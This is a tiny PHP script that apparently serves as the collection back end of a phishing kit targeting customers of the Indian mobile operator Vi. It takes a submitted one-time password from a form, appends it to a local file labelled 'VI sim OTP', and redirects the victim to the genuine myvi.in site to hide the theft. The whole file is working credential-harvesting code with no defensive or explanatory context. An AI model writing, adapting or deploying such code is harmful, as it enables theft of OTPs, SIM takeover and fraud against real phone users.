<?php
file_put_contents("otp.txt", "VI sim OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.myvi.in/');
?>
